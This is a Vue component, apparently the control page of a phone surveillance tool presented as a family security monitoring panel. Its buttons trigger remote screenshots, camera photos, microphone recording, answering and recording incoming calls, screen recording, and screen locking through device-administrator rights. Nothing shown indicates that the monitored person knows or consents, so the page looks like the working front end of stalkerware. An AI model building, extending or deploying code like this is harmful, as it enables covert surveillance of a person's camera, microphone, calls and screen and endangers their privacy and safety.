<template>
  <div class="min-h-screen bg-gray-50 pb-20">
    <div class="bg-white px-4 py-3 border-b sticky top-0 z-10 flex items-center justify-between">
      <h1 class="text-lg font-bold">远程操作</h1>
      <div class="flex gap-2">
        <button @click="shareLink" class="text-gray-400 text-sm px-2 py-1 rounded bg-gray-50">分享</button>
        <button @click="toggleFullscreen" class="text-gray-400 text-sm px-2 py-1 rounded bg-gray-50">
          {{ isFullscreen ? '退出全屏' : '全屏' }}
        </button>
      </div>
    </div>
    <div class="p-4 space-y-3">
      <div class="bg-white rounded-xl p-4 shadow-sm">
        <div class="font-medium mb-3">📱 远程截屏</div>
        <button @click="screenshot" :disabled="screenshotting"
          class="w-full py-3 bg-purple-500 text-white rounded-xl font-medium active:bg-purple-600 disabled:opacity-50">
          {{ screenshotting ? '截屏中...' : '截屏' }}
        </button>
        <div v-if="screenshotImg" class="mt-3">
          <img :src="screenshotImg" class="w-full rounded-lg cursor-pointer" @click="previewImg = screenshotImg" />
          <div class="flex gap-2 mt-2">
            <a :href="screenshotImg" download class="flex-1 py-2 bg-blue-50 text-blue-600 rounded-lg text-sm text-center font-medium">下载</a>
            <button @click="screenshotImg = ''" class="flex-1 py-2 bg-gray-50 text-gray-600 rounded-lg text-sm font-medium">清除</button>
          </div>
        </div>
      </div>

      <div class="bg-white rounded-xl p-4 shadow-sm">
        <div class="font-medium mb-3">📸 远程拍照</div>
        <button @click="capture" :disabled="capturing"
          class="w-full py-3 bg-blue-500 text-white rounded-xl font-medium active:bg-blue-600 disabled:opacity-50">
          {{ capturing ? '拍照中...' : '拍照' }}
        </button>
        <div v-if="validPhotos.length" class="mt-3">
          <div class="text-xs text-gray-400 mb-2">最近 {{ Math.min(validPhotos.length, 8) }} 张</div>
          <div class="grid grid-cols-4 gap-2">
            <div v-for="p in validPhotos.slice(0,8)" :key="p.id"
              @click="previewImg = `/api/media/file?path=${encodeURIComponent(p.filePath)}`"
              class="aspect-square bg-gray-100 rounded-lg overflow-hidden cursor-pointer active:opacity-80">
              <img :src="`/api/media/file?path=${encodeURIComponent(p.filePath)}`" class="w-full h-full object-cover" loading="lazy" onerror="this.style.display='none';this.parentElement.classList.add('hidden')" />
            </div>
          </div>
        </div>
      </div>

      <div class="bg-white rounded-xl p-4 shadow-sm">
        <div class="font-medium mb-3">🎤 远程录音</div>
        <div class="flex gap-2">
          <button v-if="!recording" @click="startRec" :disabled="recStarting"
            class="flex-1 py-3 bg-blue-500 text-white rounded-xl font-medium active:bg-blue-600 disabled:opacity-50">
            {{ recStarting ? '启动中...' : '开始录音' }}
          </button>
          <button v-else @click="stopRec" class="flex-1 py-3 bg-red-500 text-white rounded-xl font-medium active:bg-red-600">
            ⏹ 停止 ({{ recSec }}秒)
          </button>
          <button v-if="recording" @click="answerCall"
            class="flex-1 py-3 bg-green-500 text-white rounded-xl font-medium active:bg-green-600">
            📞 接听+录音
          </button>
        </div>
        <div v-if="recordings.length" class="mt-3 space-y-2">
          <div v-for="r in recordings.slice(0,5)" :key="r.id" class="p-3 bg-gray-50 rounded-lg">
            <div class="flex items-center justify-between mb-2">
              <div class="flex-1 min-w-0">
                <div class="text-sm text-gray-600 truncate">{{ r.filePath.split('/').pop() }}</div>
                <div class="text-xs text-gray-400">{{ Math.floor(r.durationMs/1000) }}秒 · {{ new Date(r.recordedTime).toLocaleString() }}</div>
              </div>
              <a :href="`/api/media/file?path=${encodeURIComponent(r.filePath)}`" download class="text-blue-500 text-xs px-2 py-1">下载</a>
            </div>
            <audio :src="`/api/media/file?path=${encodeURIComponent(r.filePath)}`" controls class="w-full h-8" preload="none"></audio>
          </div>
        </div>
      </div>

      <div class="bg-white rounded-xl p-4 shadow-sm">
        <div class="font-medium mb-3">🎬 屏幕录制</div>
        <p class="text-xs text-gray-400 mb-3">最长录制 5 分钟</p>
        <div class="flex gap-2">
          <button v-if="!isRecording" @click="startRecord" class="flex-1 py-3 bg-red-500 text-white rounded-xl font-medium active:bg-red-600">⏺ 开始录制</button>
          <button v-else @click="stopRecord" class="flex-1 py-3 bg-gray-500 text-white rounded-xl font-medium active:bg-gray-600">⏹ 停止录制</button>
        </div>
        <div v-if="isRecording" class="mt-2 text-center text-sm text-red-500 animate-pulse">● 录制中 {{ recordDuration }}秒</div>
      </div>

      <div class="bg-white rounded-xl p-4 shadow-sm">
        <div class="font-medium mb-3">🔒 屏幕控制</div>
        <div class="flex gap-2">
          <button @click="lockScreen" class="flex-1 py-3 bg-amber-500 text-white rounded-xl font-medium active:bg-amber-600">锁定屏幕</button>
          <button @click="unlockScreen" class="flex-1 py-3 bg-green-500 text-white rounded-xl font-medium active:bg-green-600">解锁屏幕</button>
        </div>
        <div class="text-xs text-gray-400 mt-2">设备管理器: {{ adminActive ? '已激活' : '未激活' }}</div>
      </div>
    </div>

    <div v-if="previewImg" @click="previewImg = ''" class="fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4 cursor-pointer">
      <img :src="previewImg" class="max-w-full max-h-full rounded-lg" @click.stop />
      <div class="absolute top-4 right-4 flex gap-2">
        <a :href="previewImg" download class="w-10 h-10 bg-black/50 rounded-full flex items-center justify-center text-white text-lg">↓</a>
        <button @click="previewImg = ''" class="w-10 h-10 bg-black/50 rounded-full flex items-center justify-center text-white text-lg">✕</button>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import { api } from '../api/client'
import { ElMessage } from 'element-plus'
import { computed } from 'vue'

const screenshotting = ref(false)
const screenshotImg = ref('')
const capturing = ref(false)
const recording = ref(false)
const recStarting = ref(false)
const recSec = ref(0)
const photos = ref<any[]>([])
const recordings = ref<any[]>([])
const adminActive = ref(false)
const previewImg = ref('')
const isFullscreen = ref(!!document.fullscreenElement)
const isRecording = ref(false)
const recordDuration = ref(0)
const validPhotos = computed(() => photos.value.filter(p => p && p.filePath))
let recTimer: any = null
let recordTimer: any = null

async function startRecord() {
  try {
    await api.post('/api/device/screenrecord', { action: 'start' })
    isRecording.value = true
    recordDuration.value = 0
    recordTimer = setInterval(() => recordDuration.value++, 1000)
    ElMessage.success('录屏已开始')
  } catch (e: any) { ElMessage.error(e.response?.data?.error || '录屏失败') }
}

async function stopRecord() {
  try {
    await api.post('/api/device/screenrecord', { action: 'stop' })
    isRecording.value = false
    clearInterval(recordTimer)
    ElMessage.success('录屏已停止')
  } catch (e: any) { ElMessage.error(e.response?.data?.error || '停止失败') }
}

function toggleFullscreen() {
  if (!document.fullscreenElement) {
    document.documentElement.requestFullscreen()
    isFullscreen.value = true
  } else {
    document.exitFullscreen()
    isFullscreen.value = false
  }
}

async function shareLink() {
  const url = window.location.href
  if (navigator.share) {
    try {
      await navigator.share({ title: '乡亲管理面板', text: '家庭安全监控管理面板', url })
      ElMessage.success('分享成功')
    } catch {}
  } else {
    await navigator.clipboard.writeText(url)
    ElMessage.success('链接已复制到剪贴板')
  }
}

onMounted(async () => {
  const [p, r, a] = await Promise.all([
    api.get('/api/camera/photos'),
    api.get('/api/audio/recordings'),
    api.get('/api/device/admin/status')
  ])
  photos.value = p.data.photos || []
  recordings.value = r.data.recordings || []
  adminActive.value = a.data.active
})

async function screenshot() {
  screenshotting.value = true; screenshotImg.value = ''
  try {
    const res = await api.post('/api/device/screenshot')
    if (res.data.path) {
      screenshotImg.value = `/api/media/file?path=${encodeURIComponent(res.data.path)}`
      ElMessage.success(`截屏成功 (${Math.round(res.data.size/1024)}KB)`)
    } else if (res.data.image && res.data.size > 0) {
      screenshotImg.value = res.data.image
      ElMessage.success(`截屏成功 (${Math.round(res.data.size/1024)}KB)`)
    } else { ElMessage.error('截屏返回空数据') }
  } catch (e: any) { ElMessage.error(e.response?.data?.error || '截屏失败') }
  screenshotting.value = false
}

async function capture() {
  capturing.value = true
  try {
    const res = await api.post('/api/camera/capture')
    ElMessage.success('拍照成功')
    photos.value.unshift({ id: res.data.id, filePath: res.data.path, takenTime: Date.now() })
  } catch (e: any) { ElMessage.error(e.response?.data?.error || '拍照失败') }
  capturing.value = false
}

async function startRec() {
  recStarting.value = true
  try {
    await api.post('/api/audio/start')
    recording.value = true; recSec.value = 0
    recTimer = setInterval(() => recSec.value++, 1000)
  } catch { ElMessage.error('开始录音失败') }
  recStarting.value = false
}

async function stopRec() {
  try {
    const res = await api.post('/api/audio/stop')
    recording.value = false; clearInterval(recTimer); recSec.value = 0
    ElMessage.success(`已保存 ${Math.floor(res.data.durationMs/1000)}秒`)
    recordings.value = (await api.get('/api/audio/recordings')).data.recordings
  } catch { ElMessage.error('停止录音失败') }
}

async function answerCall() {
  try {
    await api.post('/api/device/answer-call')
    recording.value = true; recSec.value = 0
    recTimer = setInterval(() => recSec.value++, 1000)
    ElMessage.success('来电已接听，正在录音')
  } catch (e: any) { ElMessage.error(e.response?.data?.error || '接听失败') }
}

async function lockScreen() {
  try { await api.post('/api/device/lock'); ElMessage.success('已锁定') }
  catch (e: any) { ElMessage.error(e.response?.data?.error || '锁屏失败') }
}

async function unlockScreen() {
  try { await api.post('/api/device/unlock'); ElMessage.success('已解锁') }
  catch (e: any) { ElMessage.error(e.response?.data?.error || '解锁失败') }
}
</script>
